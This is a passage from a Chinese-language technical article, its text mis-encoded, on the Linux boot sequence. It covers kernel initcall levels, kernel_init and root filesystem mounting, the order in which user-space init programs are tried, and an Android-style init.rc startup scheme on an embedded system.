    static initcall_t __initcall_##fn##id __used \
    __attribute__((__section__(<span class="hljs-string">".initcall"</span> #id <span class="hljs-string">".init"</span>))) = fn</span>

<span class="hljs-comment">// Initcallçº§åˆ«</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> pure_initcall(fn)           __define_initcall(fn, 0)  <span class="hljs-comment">// çº¯åˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> core_initcall(fn)           __define_initcall(fn, 1)  <span class="hljs-comment">// æ ¸å¿ƒåˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> postcore_initcall(fn)       __define_initcall(fn, 2)  <span class="hljs-comment">// æ ¸å¿ƒååˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> arch_initcall(fn)           __define_initcall(fn, 3)  <span class="hljs-comment">// æ¶æ„åˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> subsys_initcall(fn)         __define_initcall(fn, 4)  <span class="hljs-comment">// å­ç³»ç»Ÿåˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> fs_initcall(fn)             __define_initcall(fn, 5)  <span class="hljs-comment">// æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> device_initcall(fn)         __define_initcall(fn, 6)  <span class="hljs-comment">// è®¾å¤‡åˆå§‹åŒ–</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> late_initcall(fn)           __define_initcall(fn, 7)  <span class="hljs-comment">// æ™šæœŸåˆå§‹åŒ–</span></span>
</code></pre>
<h4 data-id="heading-108">6.11.3 Initcallæ‰§è¡Œé¡ºåº</h4>
<pre><code class="hljs language-c" lang="c">do_initcalls();
</code></pre>
<p><strong>æ‰§è¡Œé¡ºåº</strong>:</p>
<ol>
<li><strong>pure_initcall</strong>: æœ€åŸºç¡€çš„åˆå§‹åŒ–</li>
<li><strong>core_initcall</strong>: æ ¸å¿ƒå­ç³»ç»Ÿ</li>
<li><strong>postcore_initcall</strong>: æ ¸å¿ƒå­ç³»ç»Ÿä¹‹å</li>
<li><strong>arch_initcall</strong>: æ¶æ„ç›¸å…³</li>
<li><strong>subsys_initcall</strong>: å­ç³»ç»Ÿ</li>
<li><strong>fs_initcall</strong>: æ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>device_initcall</strong>: è®¾å¤‡é©±åŠ¨</li>
<li><strong>late_initcall</strong>: æœ€ååˆå§‹åŒ–</li>
</ol>
<h4 data-id="heading-109">6.11.4 Initcallç¤ºä¾‹</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// è®¾å¤‡é©±åŠ¨åˆå§‹åŒ–</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">my_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// åˆå§‹åŒ–ä»£ç </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
device_initcall(my_driver_init);  <span class="hljs-comment">// åœ¨device_initcallçº§åˆ«æ‰§è¡Œ</span>
</code></pre>
<h3 data-id="heading-110">6.12 åŸºæœ¬è®¾ç½®</h3>
<h4 data-id="heading-111">6.12.1 do_basic_setup</h4>
<pre><code class="hljs language-c" lang="c">do_basic_setup();
</code></pre>
<p><strong>ä½œç”¨</strong>: æ‰§è¡ŒåŸºæœ¬çš„ç³»ç»Ÿè®¾ç½®ã€‚</p>
<p><strong>åŒ…æ‹¬</strong>:</p>
<ol>
<li><strong>CPUé›†åˆåˆå§‹åŒ–</strong>: <code>cpuset_init_smp()</code></li>
<li><strong>é©±åŠ¨åˆå§‹åŒ–</strong>: <code>driver_init()</code></li>
<li><strong>ä¸­æ–­procæ–‡ä»¶</strong>: <code>init_irq_proc()</code></li>
<li><strong>æ„é€ å‡½æ•°</strong>: <code>do_ctors()</code></li>
<li><strong>Initcalls</strong>: <code>do_initcalls()</code></li>
</ol>
<h4 data-id="heading-112">6.12.2 é©±åŠ¨åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">driver_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–é©±åŠ¨å­ç³»ç»Ÿã€‚</p>
<p><strong>ä»»åŠ¡</strong>:</p>
<ul>
<li>åˆå§‹åŒ–è®¾å¤‡æ¨¡å‹</li>
<li>åˆå§‹åŒ–æ€»çº¿</li>
<li>åˆå§‹åŒ–è®¾å¤‡ç±»</li>
</ul>
<h3 data-id="heading-113">6.13 å‡†å¤‡å¯åŠ¨ç”¨æˆ·ç©ºé—´</h3>
<h4 data-id="heading-114">6.13.1 rest_init</h4>
<pre><code class="hljs language-c" lang="c">rest_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: å¯åŠ¨å‰©ä½™çš„åˆå§‹åŒ–å·¥ä½œã€‚</p>
<p><strong>ä¸»è¦ä»»åŠ¡</strong>:</p>
<ol>
<li><strong>å¯åŠ¨initè¿›ç¨‹</strong>: åˆ›å»ºç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹</li>
<li><strong>å¯åŠ¨kthreadd</strong>: åˆ›å»ºå†…æ ¸çº¿ç¨‹å®ˆæŠ¤è¿›ç¨‹</li>
<li><strong>è¿›å…¥idle</strong>: å½“å‰ä»»åŠ¡è¿›å…¥idleå¾ªç¯</li>
</ol>
<h4 data-id="heading-115">6.13.2 å¯åŠ¨initè¿›ç¨‹</h4>
<pre><code class="hljs language-c" lang="c">pid = kernel_thread(kernel_init, <span class="hljs-literal">NULL</span>, CLONE_FS);
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆ›å»ºinitè¿›ç¨‹ï¼ˆPID 1ï¼‰ã€‚</p>
<p><strong>kernel_init</strong>: initè¿›ç¨‹çš„ä¸»å‡½æ•°ï¼Œè´Ÿè´£å¯åŠ¨ç”¨æˆ·ç©ºé—´ã€‚</p>
<h4 data-id="heading-116">6.13.3 å¯åŠ¨kthreadd</h4>
<pre><code class="hljs language-c" lang="c">pid = kernel_thread(kthreadd, <span class="hljs-literal">NULL</span>, CLONE_FS | CLONE_FILES);
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆ›å»ºkthreaddè¿›ç¨‹ï¼ˆå†…æ ¸çº¿ç¨‹å®ˆæŠ¤è¿›ç¨‹ï¼‰ã€‚</p>
<p><strong>kthreadd</strong>: è´Ÿè´£åˆ›å»ºå’Œç®¡ç†å†…æ ¸çº¿ç¨‹ã€‚</p>
<h4 data-id="heading-117">6.13.4 è¿›å…¥idle</h4>
<pre><code class="hljs language-c" lang="c">schedule_preempt_disabled();
cpu_startup_entry(CPUHP_ONLINE);
</code></pre>
<p><strong>ä½œç”¨</strong>: å½“å‰ä»»åŠ¡ï¼ˆinit_taskï¼‰è¿›å…¥idleå¾ªç¯ã€‚</p>
<p><strong>idleå¾ªç¯</strong>: å½“æ²¡æœ‰å…¶ä»–ä»»åŠ¡è¿è¡Œæ—¶ï¼ŒCPUæ‰§è¡Œidleä»»åŠ¡ã€‚</p>
<hr/>
<h2 data-id="heading-118">7. Initè¿›ç¨‹å¯åŠ¨</h2>
<h3 data-id="heading-119">7.1 kernel_initæ¦‚è¿°</h3>
<h4 data-id="heading-120">7.1.1 kernel_initçš„ä½œç”¨</h4>
<p><code>kernel_init</code>æ˜¯initè¿›ç¨‹çš„ä¸»å‡½æ•°ï¼Œè´Ÿè´£ï¼š</p>
<ul>
<li>å®Œæˆå†…æ ¸åˆå§‹åŒ–</li>
<li>æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ</li>
<li>å¯åŠ¨ç”¨æˆ·ç©ºé—´çš„initç¨‹åº</li>
</ul>
<h4 data-id="heading-121">7.1.2 kernel_initçš„ä½ç½®</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// init/main.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> __ref <span class="hljs-title function_">kernel_init</span><span class="hljs-params">(<span class="hljs-type">void</span> *unused)</span>
{
    <span class="hljs-comment">// initè¿›ç¨‹ä»£ç </span>
}
</code></pre>
<h4 data-id="heading-122">7.1.3 kernel_initçš„æ‰§è¡Œç¯å¢ƒ</h4>
<p>æ‰§è¡Œ<code>kernel_init</code>æ—¶ï¼š</p>
<ul>
<li><strong>è¿›ç¨‹</strong>: æ–°çš„å†…æ ¸çº¿ç¨‹ï¼Œå°†æˆä¸ºinitè¿›ç¨‹</li>
<li><strong>PID</strong>: 1</li>
<li><strong>æƒé™</strong>: å†…æ ¸æƒé™ï¼ˆç¨åä¼šåˆ‡æ¢åˆ°ç”¨æˆ·ç©ºé—´ï¼‰</li>
</ul>
<h3 data-id="heading-123">7.2 ç­‰å¾…kthreaddå°±ç»ª</h3>
<h4 data-id="heading-124">7.2.1 ä¸ºä»€ä¹ˆéœ€è¦ç­‰å¾…ï¼Ÿ</h4>
<pre><code class="hljs language-c" lang="c">wait_for_completion(&amp;kthreadd_done);
</code></pre>
<p><strong>åŸå› </strong>: kthreaddéœ€è¦å…ˆå°±ç»ªï¼Œå› ä¸ºåç»­åˆå§‹åŒ–å¯èƒ½éœ€è¦åˆ›å»ºå†…æ ¸çº¿ç¨‹ã€‚</p>
<p><strong>æœºåˆ¶</strong>: ä½¿ç”¨å®Œæˆé‡ï¼ˆcompletionï¼‰åŒæ­¥ã€‚</p>
<h3 data-id="heading-125">7.3 kernel_init_freeable</h3>
<h4 data-id="heading-126">7.3.1 å¯é‡Šæ”¾åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">kernel_init_freeable();
</code></pre>
<p><strong>ä½œç”¨</strong>: æ‰§è¡Œå¯ä»¥é‡Šæ”¾åˆå§‹åŒ–å†…å­˜çš„åˆå§‹åŒ–å·¥ä½œã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆå«"freeable"</strong>: è¿™äº›åˆå§‹åŒ–å®Œæˆåï¼Œå¯ä»¥é‡Šæ”¾åˆå§‹åŒ–æ—¶ä½¿ç”¨çš„å†…å­˜ã€‚</p>
<h4 data-id="heading-127">7.3.2 ä¸»è¦ä»»åŠ¡</h4>
<ol>
<li>
<p><strong>è®¾ç½®å†…å­˜åˆ†é…æ©ç </strong></p>
<pre><code class="hljs language-c" lang="c">gfp_allowed_mask = __GFP_BITS_MASK;
</code></pre>
<p>å…è®¸ä½¿ç”¨æ‰€æœ‰å†…å­˜åˆ†é…æ ‡å¿—ã€‚</p>
</li>
<li>
<p><strong>è®¾ç½®å†…å­˜èŠ‚ç‚¹</strong></p>
<pre><code class="hljs language-c" lang="c">set_mems_allowed(node_states[N_MEMORY]);
</code></pre>
<p>å…è®¸åœ¨ä»»æ„å†…å­˜èŠ‚ç‚¹åˆ†é…å†…å­˜ã€‚</p>
</li>
<li>
<p><strong>SMPå‡†å¤‡</strong></p>
<pre><code class="hljs language-c" lang="c">smp_prepare_cpus(setup_max_cpus);
</code></pre>
<p>å‡†å¤‡å…¶ä»–CPUã€‚</p>
</li>
<li>
<p><strong>å·¥ä½œé˜Ÿåˆ—åˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c">workqueue_init();
</code></pre>
<p>åˆå§‹åŒ–å·¥ä½œé˜Ÿåˆ—ç³»ç»Ÿã€‚</p>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†å†…éƒ¨åˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c">init_mm_internals();
</code></pre>
<p>åˆå§‹åŒ–å†…å­˜ç®¡ç†å†…éƒ¨ç»“æ„ã€‚</p>
</li>
<li>
<p><strong>æ—©æœŸInitcalls</strong></p>
<pre><code class="hljs language-c" lang="c">do_pre_smp_initcalls();
</code></pre>
<p>æ‰§è¡ŒSMPä¹‹å‰çš„initcallsã€‚</p>
</li>
<li>
<p><strong>é”æ£€æµ‹å™¨åˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c">lockup_detector_init();
</code></pre>
<p>åˆå§‹åŒ–æ­»é”æ£€æµ‹å™¨ã€‚</p>
</li>
<li>
<p><strong>SMPåˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c">smp_init();
</code></pre>
<p>å¯åŠ¨å…¶ä»–CPUã€‚</p>
</li>
<li>
<p><strong>è°ƒåº¦å™¨SMPåˆå§‹åŒ–</strong></p>
<pre><code class="hljs language-c" lang="c">sched_init_smp();
</code></pre>
<p>åˆå§‹åŒ–SMPè°ƒåº¦ã€‚</p>
</li>
<li>
<p><strong>åŸºæœ¬è®¾ç½®</strong></p>
<pre><code class="hljs language-c" lang="c">do_basic_setup();
</code></pre>
<p>æ‰§è¡ŒåŸºæœ¬ç³»ç»Ÿè®¾ç½®ã€‚</p>
</li>
<li>
<p><strong>ç­‰å¾…initramfs</strong></p>
<pre><code class="hljs language-c" lang="c">wait_for_initramfs();
</code></pre>
<p>ç­‰å¾…initramfså°±ç»ªï¼ˆå¦‚æœä½¿ç”¨ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ§åˆ¶å°å°±ç»ª</strong></p>
<pre><code class="hljs language-c" lang="c">console_on_rootfs();
</code></pre>
<p>åœ¨æ ¹æ–‡ä»¶ç³»ç»Ÿä¸Šæ‰“å¼€æ§åˆ¶å°ã€‚</p>
</li>
<li>
<p><strong>å‡†å¤‡å‘½åç©ºé—´</strong></p>
<pre><code class="hljs language-c" lang="c">prepare_namespace();
</code></pre>
<p>å‡†å¤‡å‘½åç©ºé—´ï¼ˆæŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰ã€‚</p>
</li>
</ol>
<h3 data-id="heading-128">7.4 æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½</h3>
<h4 data-id="heading-129">7.4.1 prepare_namespace</h4>
<pre><code class="hljs language-c" lang="c">prepare_namespace();
</code></pre>
<p><strong>ä½œç”¨</strong>: å‡†å¤‡å‘½åç©ºé—´ï¼Œä¸»è¦æ˜¯æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<h4 data-id="heading-130">7.4.2 æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½æµç¨‹</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">prepare_namespace</span>()
    â†“
æŒ‚è½½initramfs (å¦‚æœä½¿ç”¨)
    â†“
æ‰§è¡Œinitramfsä¸­çš„init (å¦‚æœå­˜åœ¨)
    â†“
æŒ‚è½½çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ
    â†“
åˆ‡æ¢åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿ
    â†“
å¸è½½initramfs (å¦‚æœä½¿ç”¨)
</code></pre>
<h4 data-id="heading-131">7.4.3 æ ¹æ–‡ä»¶ç³»ç»Ÿç±»å‹</h4>
<p>å†…æ ¸æ”¯æŒå¤šç§æ ¹æ–‡ä»¶ç³»ç»Ÿï¼š</p>
<ul>
<li><strong>ext2/ext3/ext4</strong>: ä¼ ç»Ÿçš„Linuxæ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>squashfs</strong>: å‹ç¼©çš„åªè¯»æ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>initramfs</strong>: åˆå§‹RAMæ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>NFS</strong>: ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>å…¶ä»–</strong>: æ ¹æ®å†…æ ¸é…ç½®æ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿ</li>
</ul>
<h4 data-id="heading-132">7.4.4 æ ¹è®¾å¤‡æŒ‡å®š</h4>
<p>æ ¹è®¾å¤‡å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŒ‡å®šï¼š</p>
<ol>
<li><strong>å†…æ ¸å‚æ•°</strong>: <code>root=/dev/sda1</code></li>
<li><strong>UUID</strong>: <code>root=UUID=xxx</code></li>
<li><strong>PARTUUID</strong>: <code>root=PARTUUID=xxx</code></li>
<li><strong>è®¾å¤‡æ ‘</strong>: è®¾å¤‡æ ‘ä¸­æŒ‡å®š</li>
</ol>
<h3 data-id="heading-133">7.5 é‡Šæ”¾åˆå§‹åŒ–å†…å­˜</h3>
<h4 data-id="heading-134">7.5.1 é‡Šæ”¾ç›®çš„</h4>
<p>åˆå§‹åŒ–å®Œæˆåï¼Œå¯ä»¥é‡Šæ”¾ï¼š</p>
<ul>
<li>åˆå§‹åŒ–ä»£ç æ®µ</li>
<li>åˆå§‹åŒ–æ•°æ®æ®µ</li>
<li>ä¸å†éœ€è¦çš„åˆå§‹åŒ–æ•°æ®ç»“æ„</li>
</ul>
<h4 data-id="heading-135">7.5.2 é‡Šæ”¾è¿‡ç¨‹</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰å¼‚æ­¥åˆå§‹åŒ–å®Œæˆ</span>
async_synchronize_full();

<span class="hljs-comment">// é‡Šæ”¾å„ç§åˆå§‹åŒ–å†…å­˜</span>
kprobe_free_init_mem();
ftrace_free_init_mem();
kgdb_free_init_mem();
exit_boot_config();
free_initmem();
</code></pre>
<h4 data-id="heading-136">7.5.3 æ ‡è®°åªè¯»</h4>
<pre><code class="hljs language-c" lang="c">mark_readonly();
</code></pre>
<p><strong>ä½œç”¨</strong>: å°†å†…æ ¸ä»£ç æ®µæ ‡è®°ä¸ºåªè¯»ã€‚</p>
<p><strong>ç›®çš„</strong>: é˜²æ­¢å†…æ ¸ä»£ç è¢«ä¿®æ”¹ï¼Œæé«˜å®‰å…¨æ€§ã€‚</p>
<h3 data-id="heading-137">7.6 å¯åŠ¨ç”¨æˆ·ç©ºé—´init</h3>
<h4 data-id="heading-138">7.6.1 å¯åŠ¨é¡ºåº</h4>
<p>initè¿›ç¨‹æŒ‰ä»¥ä¸‹é¡ºåºå°è¯•å¯åŠ¨ç”¨æˆ·ç©ºé—´initï¼š</p>
<ol>
<li><strong>ramdisk_execute_command</strong>: é€šå¸¸æ˜¯<code>/init</code>ï¼ˆinitramfsä¸­çš„initï¼‰</li>
<li><strong>execute_command</strong>: å†…æ ¸å‚æ•°<code>init=</code>æŒ‡å®šçš„ç¨‹åº</li>
<li><strong>CONFIG_DEFAULT_INIT</strong>: ç¼–è¯‘æ—¶æŒ‡å®šçš„é»˜è®¤init</li>
<li><strong>æ ‡å‡†è·¯å¾„</strong>:
<ul>
<li><code>/sbin/init</code></li>
<li><code>/etc/init</code></li>
<li><code>/bin/init</code></li>
<li><code>/bin/sh</code></li>
</ul>
</li>
</ol>
<h4 data-id="heading-139">7.6.2 å¯åŠ¨ä»£ç </h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 1. å°è¯•ramdisk_execute_command</span>
<span class="hljs-keyword">if</span> (ramdisk_execute_command) {
    ret = run_init_process(ramdisk_execute_command);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 2. å°è¯•execute_command</span>
<span class="hljs-keyword">if</span> (execute_command) {
    ret = run_init_process(execute_command);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    panic(<span class="hljs-string">"Requested init %s failed"</span>, execute_command);
}

<span class="hljs-comment">// 3. å°è¯•é»˜è®¤init</span>
<span class="hljs-keyword">if</span> (CONFIG_DEFAULT_INIT[<span class="hljs-number">0</span>] != <span class="hljs-string">'\0'</span>) {
    ret = run_init_process(CONFIG_DEFAULT_INIT);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 4. å°è¯•æ ‡å‡†è·¯å¾„</span>
<span class="hljs-keyword">if</span> (!try_to_run_init_process(<span class="hljs-string">"/sbin/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/etc/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/bin/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/bin/sh"</span>))
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

<span class="hljs-comment">// 5. å¦‚æœéƒ½å¤±è´¥ï¼Œpanic</span>
panic(<span class="hljs-string">"No working init found"</span>);
</code></pre>
<h4 data-id="heading-140">7.6.3 run_init_process</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_init_process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *init_filename)</span>
{
    argv_init[<span class="hljs-number">0</span>] = init_filename;
    <span class="hljs-keyword">return</span> kernel_execve(init_filename, argv_init, envp_init);
}
</code></pre>
<p><strong>ä½œç”¨</strong>: æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„initç¨‹åºã€‚</p>
<p><strong>å…³é”®</strong>: è¿™æ˜¯å†…æ ¸æ‰§è¡Œçš„æœ€åä¸€ä¸ªå‡½æ•°ï¼Œä¹‹åæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ç©ºé—´ã€‚</p>
<hr/>
<h2 data-id="heading-141">8. ç”¨æˆ·ç©ºé—´åº”ç”¨å¯åŠ¨</h2>
<h3 data-id="heading-142">8.1 Initç¨‹åºæ¦‚è¿°</h3>
<h4 data-id="heading-143">8.1.1 Initç¨‹åºçš„ä½œç”¨</h4>
<p>Initç¨‹åºæ˜¯ç”¨æˆ·ç©ºé—´çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ˆPID 1ï¼‰ï¼Œè´Ÿè´£ï¼š</p>
<ul>
<li>å¯åŠ¨ç³»ç»ŸæœåŠ¡</li>
<li>ç®¡ç†è¿›ç¨‹</li>
<li>å¤„ç†å­¤å„¿è¿›ç¨‹</li>
<li>ç³»ç»Ÿå…³é—­</li>
</ul>
<h4 data-id="heading-144">8.1.2 å¸¸è§çš„Initç¨‹åº</h4>
<ul>
<li><strong>SysV init</strong>: ä¼ ç»Ÿçš„initç³»ç»Ÿ</li>
<li><strong>systemd</strong>: ç°ä»£çš„initç³»ç»Ÿï¼ˆå¤§å¤šæ•°Linuxå‘è¡Œç‰ˆä½¿ç”¨ï¼‰</li>
<li><strong>Upstart</strong>: Ubuntuæ›¾ç»ä½¿ç”¨çš„initç³»ç»Ÿ</li>
<li><strong>BusyBox init</strong>: åµŒå…¥å¼ç³»ç»Ÿå¸¸ç”¨ï¼ˆæœ¬ç³»ç»Ÿä½¿ç”¨ï¼‰</li>
<li><strong>OpenRC</strong>: Gentooç­‰å‘è¡Œç‰ˆä½¿ç”¨</li>
<li><strong>init.rc</strong>: Androidé£æ ¼çš„å¯åŠ¨è„šæœ¬ï¼ˆæœ¬ç³»ç»Ÿä½¿ç”¨ï¼‰</li>
</ul>
<h3 data-id="heading-145">8.2 Init.rcå¯åŠ¨æœºåˆ¶ï¼ˆæœ¬ç³»ç»Ÿä½¿ç”¨ï¼‰</h3>
<h4 data-id="heading-146">8.2.1 Init.rcæ¦‚è¿°</h4>
<p>æœ¬ç³»ç»Ÿä½¿ç”¨<strong>init.rc</strong>ä½œä¸ºä¸»è¦çš„å¯åŠ¨è„šæœ¬æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ç§ç±»ä¼¼Androidçš„å¯åŠ¨è„šæœ¬ç³»ç»Ÿï¼Œç»“åˆäº†OpenWrtçš„procdè¿›ç¨‹ç®¡ç†ã€‚</p>
<h4 data-id="heading-147">8.2.2 Init.rcçš„ç‰¹ç‚¹</h4>
<ol>
<li><strong>Androidé£æ ¼è¯­æ³•</strong>: ä½¿ç”¨ç±»ä¼¼Androidçš„init.rcè¯­æ³•</li>
<li><strong>æœåŠ¡å®šä¹‰</strong>: å¯ä»¥å®šä¹‰ç³»ç»ŸæœåŠ¡</li>
<li><strong>è§¦å‘å™¨</strong>: æ”¯æŒon initã€on bootã€on startupç­‰è§¦å‘å™¨</li>
<li><strong>è¿›ç¨‹ç®¡ç†</strong>: ä½¿ç”¨procdè¿›è¡Œè¿›ç¨‹ç®¡ç†å’Œç›‘æ§</li>
<li><strong>ä¾èµ–ç®¡ç†</strong>: æ”¯æŒæœåŠ¡ä¾èµ–å…³ç³»</li>
</ol>
<h4 data-id="heading-148">8.2.3 Init.rcæ–‡ä»¶ä½ç½®</h4>
<p>ç³»ç»Ÿä¸­å­˜åœ¨å¤šä¸ªinit.rcç›¸å…³æ–‡ä»¶ï¼š</p>
<ul>
<li><strong><code>/etc/init.rc</code></strong>: ä¸»è¦çš„init.rcé…ç½®æ–‡ä»¶</li>
<li><strong><code>/etc/init.d/init.rc</code></strong>: init.rcæœåŠ¡çš„å¯åŠ¨è„šæœ¬</li>
<li><strong><code>/etc/rc.d/S15init.rc</code></strong>: å¯åŠ¨æ—¶çš„ç¬¦å·é“¾æ¥</li>
<li><strong><code>/etc/rc.d/K15init.rc</code></strong>: å…³é—­æ—¶çš„ç¬¦å·é“¾æ¥</li>
</ul>
<h4 data-id="heading-149">8.2.4 Init.rcè¯­æ³•</h4>
<h5 data-id="heading-150">è§¦å‘å™¨ï¼ˆTriggerï¼‰</h5>
<p>è§¦å‘å™¨å®šä¹‰äº†åœ¨ç‰¹å®šæ—¶æœºæ‰§è¡Œçš„å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-rc" lang="rc">on init
    import /etc/cgroup.rc

on boot
    class_start default
    import /oem/node/nardds/conf/init/nardds.rc

on startup
    exec /usr/bin/startup_app.sh &amp;
</code></pre>
<p><strong>å¸¸è§çš„è§¦å‘å™¨</strong>:</p>
<ul>
<li><strong>on init</strong>: ç³»ç»Ÿåˆå§‹åŒ–æ—¶æ‰§è¡Œ</li>
<li><strong>on boot</strong>: ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œ</li>
<li><strong>on startup</strong>: ç³»ç»Ÿå°±ç»ªåæ‰§è¡Œ</li>
<li><strong>on property</strong>: å±æ€§å˜åŒ–æ—¶æ‰§è¡Œ</li>
<li><strong>on fs</strong>: æ–‡ä»¶ç³»ç»ŸæŒ‚è½½æ—¶æ‰§è¡Œ</li>
</ul>
<h5 data-id="heading-151">æœåŠ¡å®šä¹‰ï¼ˆServiceï¼‰</h5>
<p>æœåŠ¡å®šä¹‰äº†ç³»ç»ŸæœåŠ¡çš„å¯åŠ¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-rc" lang="rc">service toplog /oem/script/utils/dump_top_log.sh
    oneshot
    disabled

service audio_server /oem/script/utils/audio_server
    retry 10
    disabled

service dhcpcd /sbin/dhcpcd -f /etc/dhcpcd.conf
    suc_oneshot
    retry 10
    disabled
</code></pre>
<p><strong>æœåŠ¡å±æ€§</strong>:</p>
<ul>
<li><strong>oneshot</strong>: æœåŠ¡åªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸æŒç»­è¿è¡Œ</li>
<li><strong>suc_oneshot</strong>: æˆåŠŸæ‰§è¡Œä¸€æ¬¡åé€€å‡º</li>
<li><strong>retry</strong>: å¤±è´¥åé‡è¯•æ¬¡æ•°</li>
<li><strong>disabled</strong>: é»˜è®¤ä¸å¯åŠ¨ï¼Œéœ€è¦æ‰‹åŠ¨å¯åŠ¨</li>
<li><strong>class</strong>: æœåŠ¡æ‰€å±çš„ç±»</li>
<li><strong>user</strong>: è¿è¡ŒæœåŠ¡çš„ç”¨æˆ·</li>
</ul>
<h4 data-id="heading-152">8.2.5 Init.rcå¯åŠ¨æµç¨‹</h4>
<h5 data-id="heading-153">å®Œæ•´çš„å¯åŠ¨æµç¨‹</h5>
<pre><code class="hljs language-csharp" lang="csharp">å†…æ ¸å¯åŠ¨<span class="hljs-keyword">init</span>è¿›ç¨‹
    â†“
è¯»å–/etc/inittab
    â†“
æ‰§è¡Œ/etc/<span class="hljs-keyword">init</span>.d/rcS S boot
    â†“
æ‰§è¡Œ/etc/rc.d/ä¸‹çš„å¯åŠ¨è„šæœ¬ï¼ˆæŒ‰STARTé¡ºåºï¼‰
    â”œâ”€ S10boot (START=<span class="hljs-number">10</span>)
    â”‚   â””â”€ æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€åˆå§‹åŒ–ç¡¬ä»¶
    â”œâ”€ S12syslogd (START=<span class="hljs-number">12</span>)
    â”‚   â””â”€ å¯åŠ¨ç³»ç»Ÿæ—¥å¿—æœåŠ¡
    â”œâ”€ S15init.rc (START=<span class="hljs-number">15</span>)
    â”‚   â””â”€ å¯åŠ¨<span class="hljs-keyword">init</span>.rcæœåŠ¡
    â”‚       â””â”€ æ‰§è¡Œ/usr/bin/<span class="hljs-keyword">init</span>.rc
    â”‚           â””â”€ è§£æ/etc/<span class="hljs-keyword">init</span>.rc
    â”‚               â”œâ”€ æ‰§è¡Œ<span class="hljs-keyword">on</span> <span class="hljs-keyword">init</span>è§¦å‘å™¨
    â”‚               â”œâ”€ æ‰§è¡Œ<span class="hljs-keyword">on</span> bootè§¦å‘å™¨
    â”‚               â””â”€ å¯åŠ¨å®šä¹‰çš„æœåŠ¡
    â””â”€ S80auto_startup (START=<span class="hljs-number">80</span>)
        â””â”€ å¯åŠ¨è‡ªåŠ¨å¯åŠ¨çš„åº”ç”¨
</code></pre>
<h5 data-id="heading-154">Inittabé…ç½®</h5>
<p><code>/etc/inittab</code>æ–‡ä»¶å®šä¹‰äº†initè¿›ç¨‹çš„è¡Œä¸ºï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">:</span><span class="hljs-symbol">:sysinit</span><span class="hljs-symbol">:/etc/init</span>.d/rcS S boot
